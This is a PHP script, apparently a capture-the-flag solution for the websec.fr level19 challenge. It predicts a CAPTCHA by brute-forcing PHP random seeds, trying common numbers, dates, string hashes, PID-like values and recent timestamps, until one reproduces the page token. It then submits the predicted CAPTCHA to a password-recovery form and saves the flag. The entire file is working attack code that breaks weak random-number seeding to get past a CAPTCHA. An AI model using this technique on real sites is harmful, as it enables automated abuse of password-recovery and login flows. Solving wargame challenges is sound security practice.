<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    KNOWN/COMMON SEEDS ATTACK                               ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$round = 0;

while (true) {
    $round++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    echo "[Round $round] Testing known/common seeds | Token: " . substr($real_token, 0, 10) . "...\n";
    
    // Lista de seeds comunes/conocidos
    $known_seeds = [];
    
    // 1. Seeds basados en números comunes
    $common_numbers = [0, 1, 42, 69, 123, 420, 666, 777, 1234, 12345, 123456, 1337, 31337];
    foreach ($common_numbers as $n) {
        $known_seeds[] = $n;
    }
    
    // 2. Seeds basados en la fecha "websec"
    // Tal vez usan una fecha fija como "websec fue creado el..."
    $known_dates = [
        strtotime('2000-01-01'),
        strtotime('2010-01-01'),
        strtotime('2015-01-01'),
        strtotime('2020-01-01'),
        strtotime('2021-01-01'),
        strtotime('2022-01-01'),
        strtotime('2023-01-01'),
        strtotime('2024-01-01'),
        strtotime('2025-01-01'),
    ];
    foreach ($known_dates as $d) {
        $known_seeds[] = $d;
    }
    
    // 3. Seeds basados en el hash de "websec" o "level19"
    $strings_to_hash = ['websec', 'level19', 'websec.fr', 'captcha', 'random', 'php'];
    foreach ($strings_to_hash as $str) {
        // CRC32
        $known_seeds[] = crc32($str);
        // Primeros N dígitos del MD5 como entero
        $md5 = md5($str);
        $known_seeds[] = intval(substr($md5, 0, 8), 16) % 2147483647;
    }
    
    // 4. PID del proceso (procesos típicos)
    for ($pid = 1; $pid <= 65536; $pid += 100) {
        $known_seeds[] = $pid;
    }
    
    // 5. Timestamps recientes
    $now = time();
    for ($offset = -86400; $offset <= 3600; $offset += 60) {
        $known_seeds[] = $now + $offset;
    }
    
    // Eliminar duplicados
    $known_seeds = array_unique($known_seeds);
    
    if ($round == 1) {
        echo "  Total unique seeds to test: " . count($known_seeds) . "\n";
    }
    
    $tested = 0;
    foreach ($known_seeds as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        $tested++;
        
        if ($test_token === $real_token) {
            echo "\n  ✓✓✓ MATCH WITH KNOWN SEED! ✓✓✓\n";
            echo "  Seed: $seed\n";
            
            // Identificar qué tipo de seed es
            if ($seed >= 946684800 && $seed <= 1893456000) {
                echo "  (This is a Unix timestamp: " . date('Y-m-d', $seed) . ")\n";
            } elseif ($seed < 100000) {
                echo "  (This is a small number/PID-like value)\n";
            }
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "  Predicted CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n  SUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "  FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
        
        if ($tested % 5000 == 0) {
            echo "  Progress: $tested/" . count($known_seeds) . "\n";
        }
    }
    
    usleep(200000);
}
?>